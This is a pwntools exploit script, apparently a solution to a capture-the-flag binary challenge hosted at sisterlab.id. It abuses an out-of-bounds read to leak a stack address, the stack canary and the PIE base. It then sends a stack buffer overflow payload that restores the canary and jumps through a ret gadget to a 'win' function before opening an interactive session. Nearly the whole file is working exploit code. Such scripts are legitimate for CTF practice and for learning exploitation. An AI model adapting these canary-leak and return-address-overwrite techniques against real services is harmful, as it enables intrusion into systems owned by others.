from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]

elf = "./main"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+460
    b* main+496
    c
    c
"""

conn = "sisterlab.id 42042"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io.sendlineafter(b': ', b'-1')

# for i in range(16):
#     io.sendlineafter(b': ', b'1')
#     io.sendlineafter(b': ', 0x8 * chr(ord('a') + i).encode())
#     io.sendlineafter(b': ', b'0')
#     # io.sendlineafter(b': ', str((i + 1) * 0x10).encode())

io.sendlineafter(b': ', b'1')
io.sendlineafter(b': ', b'A' * 8)
io.sendlineafter(b': ', b'0')

# io.interactive()

def leak(index):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b': ', str(index).encode())
    io.sendlineafter(b': ', b'y')

    io.recvuntil(b'to be paid: ')
    return int(io.recvline(False))

def leak_q(index, diffs=[]):
    lsb = leak(index) - sum(diffs)
    
    msb = leak(index + 1) - lsb - sum(diffs)

    return lsb, msb

def leak_until(index):
    diffs = []
    
    for i in range(index):
        bits = leak(i) - sum(diffs)
        diffs.append(bits)
    
    lsb = leak(index) - sum(diffs)

    msb = leak(index + 1) - lsb - sum(diffs)

    return lsb, msb

lsb_stack, msb_stack = leak_until(17)

stack_leak = msb_stack << 32 | lsb_stack

print(f'stack leak: {hex(stack_leak)}')

lsb_canary, msb_canary = leak_until(51)

canary_leak = msb_canary << 32 | lsb_canary

print(f'canary leak: {hex(canary_leak)}')

lsb_main, msb_main = leak_until(63)

main_leak = msb_main << 32 | lsb_main

elf.address = main_leak - elf.sym['main']

io.sendlineafter(b': ', b'4919')

payload = b'A' * 136
payload += p64(canary_leak)
payload += p64(elf.bss(16))
payload += p64(next(elf.search(asm('ret'))))
payload += p64(elf.sym['win'])

io.sendlineafter(b'!\n', payload)

io.sendlineafter(b': ', b'4')

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
